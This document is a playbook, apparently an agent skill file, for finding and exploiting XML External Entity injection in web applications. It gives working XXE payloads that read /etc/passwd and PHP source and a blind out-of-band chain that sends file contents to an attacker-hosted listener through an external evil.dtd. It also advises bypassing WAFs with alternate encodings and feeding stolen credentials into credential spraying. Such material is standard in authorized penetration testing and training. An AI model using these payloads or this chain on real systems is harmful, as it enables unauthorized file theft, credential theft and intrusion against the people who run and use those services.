---
name: web-xxe
description: XML External Entity injection detection→file-read/SSRF→proof for web apps. Use when the app parses XML you influence - SOAP/REST XML bodies, SAML, RSS/Atom, DOCX/XLSX/SVG/XML file uploads, sitemap import, SVG avatars. Triggers - Content-Type application/xml or text/xml, <?xml, SOAPAction header, SAMLResponse, .docx/.svg upload, XML parse error.
tags: [vuln_assess, exploitation]
---

# XXE (XML External Entity)

## When this fires
The server parses attacker-influenced XML: XML/SOAP APIs, SAML, RSS import, or office/SVG file uploads (DOCX/XLSX are zipped XML — inject into `word/document.xml` etc.).

## Detect
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<root>&x;</root>
```
If `/etc/passwd` comes back in the response → classic in-band XXE. No reflection → test blind (OOB) below.

## Decide
- Entity value reflected in a response field → in-band file read.
- Not reflected but parser fetches your DTD → **blind XXE** → OOB exfil via external DTD.
- Non-printable/multiline files break the parser → use `php://filter` base64 wrapper (PHP) to read source.
- Entity fetches arbitrary URLs → **XXE→SSRF** (hit internal services / cloud metadata; see web-ssrf).

## Exploit → PROVE IMPACT
```xml
<!-- source disclosure (PHP): -->
<!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&x;</root>
<!-- blind OOB exfil (host evil.dtd on your listener): -->
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://<OOB>/evil.dtd"> %p;]>
<!-- evil.dtd: -->
<!ENTITY % f SYSTEM "file:///etc/passwd">
<!ENTITY % e "<!ENTITY &#x25; x SYSTEM 'http://<OOB>/?d=%f;'>"> %e; %x;
```
**Proof required:** contents of a server file (`/etc/passwd`, app source, a secret) or a provable OOB fetch of a file's bytes. Read creds → add_credential + cred_spray.

## Tooling
`nuclei -tags xxe`; for DOCX/XLSX: unzip, inject into the XML part, re-zip, upload. Host the OOB DTD on your attacker box (internal targets: transfer the listener inward).

## False positives / pitfalls
- Parser has external entities disabled → in-band fails; blind/parameter-entity variant may still work; if the DTD isn't fetched at all, it's patched.
- WAF blocks `<!DOCTYPE>` → try UTF-16/UTF-7 encoding, or a nested/parameter-entity form.
- Reflected-but-not-parsed input = not XXE.
